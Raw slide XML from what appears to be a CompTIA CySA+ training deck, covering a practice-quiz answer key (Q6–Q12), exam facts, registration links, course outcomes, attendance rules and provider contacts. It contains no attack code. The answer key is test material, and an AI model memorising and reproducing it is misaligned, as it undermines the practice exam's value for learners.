              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Q6: B — Unhandled quote characters breaking SQL syntax is the classic first indicator of SQL injection.</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905</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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PRACTICE EXAM</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Practice Quiz — Answer Key (2/2)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400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Q7: B — Memory is lost on power-off; capture volatile evidence first, then isolate to stop spread.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Q8: B — Transmitting the weaponised payload to the victim is the Delivery stage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Q9: A — The chain of custody documents every transfer and handler, keeping evidence admissible.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Q10: B — MTTD/MTTR trend lines directly show how fast the SOC finds and resolves incidents.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Q11: B — The post-incident lessons-learned review feeds corrective actions back into the IR plan.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Q12: B — Executives need a prioritised, risk-based summary — not raw technical detail.</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906</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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CERTIFICATION</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CompTIA CySA+ Exam Registration</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907</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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EXAM DETAILS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CompTIA CySA+ (CS0-003) Exam Facts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773936"/>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77393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347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Exam code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CS0-003 · launched June 2023 (V4/CS0-004 announced — check comptia.org for transition dates).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2551176"/>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551176"/>
            <a:ext cx="91440" cy="5303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2679192"/>
            <a:ext cx="9427464" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Questions &amp; time</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Maximum 85 questions (multiple-choice + performance-based) in 165 minutes.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3319272"/>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53035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31012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31012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9427464" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Passing score</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>750 on a scale of 100–900.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4087368"/>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087368"/>
            <a:ext cx="91440" cy="53035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407822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407822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4215384"/>
            <a:ext cx="9427464" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Recommended experience</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Network+/Security+ plus ~4 years of hands-on security experience.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Rectangle 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4855464"/>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484632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9427464" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Delivery</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Pearson VUE — in-person test centre or OnVUE online proctored.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Rectangle 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5623560"/>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77240" y="5623560"/>
            <a:ext cx="91440" cy="5303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033272" y="561441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33272" y="561441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1764792" y="5751576"/>
            <a:ext cx="9427464" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Renewal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Valid 3 years; renew via CompTIA Continuing Education (60 CEUs).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908</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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REGISTRATION STEPS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How to Register for the CySA+ Exam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Create your CompTIA account at login.comptia.org</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Buy the CySA+ exam voucher at store.comptia.org</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Schedule your exam at Pearson VUE — test centre or OnVUE online</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Sit the CS0-003 exam and pass with 750+</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Claim your digital badge and start your CE renewal cycle</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909</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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REGISTRATION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Exam Registration — Useful Links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600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  CySA+ certification page: https://www.comptia.org/certifications/cybersecurity-analyst</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  CompTIA store (vouchers): https://store.comptia.org</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Pearson VUE scheduling: https://home.pearsonvue.com/comptia</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Tip: bundle the voucher with a retake option if you want a safety net.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Use the practice exam results to decide when you are ready to book.</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910</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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WRAP-UP</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Course Summary &amp; Next Steps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911</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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LEARNING OUTCOMES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What You Achieved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Security Operations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Analysed logs, network traffic, email and IoCs; used threat intelligence and MITRE ATT&amp;CK.</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Vulnerability Management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Discovered assets, ran vulnerability scans, prioritised with CVSS and hardened systems.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Incident Response</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Applied attack frameworks, forensics, containment and IR playbooks.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Reporting &amp; Communication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Produced vulnerability, incident, metrics and compliance reports for stakeholders.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912</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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FEEDBACK</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Cert &amp; TRAQOM Survey (Mandatory)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Complete the mandatory TRAQOM survey and claim your certificate via the LMS/TMS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  https://lms-tms.tertiaryinfotech.com</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913</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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WHAT'S NEXT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Recommended Courses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WSQ – CompTIA Security+ Training</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WSQ – CompTIA PenTest+ Training</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WSQ – CompTIA Linux+ Training</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WSQ – CompTIA Server+ Training</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WSQ – CompTIA A+ Training (Core 1 &amp; 2)</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46904"/>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WSQ – Certified Ethical Hacking (CEH) Training</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914</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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WE'RE HERE TO HELP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Support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If you have any enquiries during and after the class, contact us:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Email: enquiry@tertiaryinfotech.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Tel: +65 6100 0613</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Website: www.tertiarycourses.com.sg</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915</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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FINAL ASSESSMENT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Written Assessment (SAQ) — 1 hour.  Case Study (CS) — 1 hour.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Open book: slides, Learner Guide and approved materials only.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Remember to take the Assessment digital attendance (TRAQOM).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Submit your completed answers on the LMS at https://lms-tms.tertiaryinfotech.com</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916</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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ON ASSESSMENT DAY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Assessment Flow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TRAQOM survey — scan the QR code on the LMS</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Assessment digital attendance — scan the SSG QR</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Sit WA (SAQ) then Case Study — open book</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Submit your answers on the LMS</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Sign the Assessment Summary Record</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917</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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TRAQOM · SSG DIGITAL ATTENDANCE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Digital Attendance (Mandatory)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It is mandatory to take the AM, PM and Assessment digital attendance for WSQ-funded courses.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The trainer/administrator displays the digital attendance QR code from the SSG portal.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Scan the QR code with your mobile phone camera and submit your attendance.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A minimum of 75% attendance is required to be eligible for assessment and funding.</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918</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide9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SEE YOU IN THE SOC</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Thank You!</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You are now ready to work as a cybersecurity analyst — and to sit the CompTIA CySA+ exam.</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CySA+ (CS0-003)  ·  TGS-2024049211</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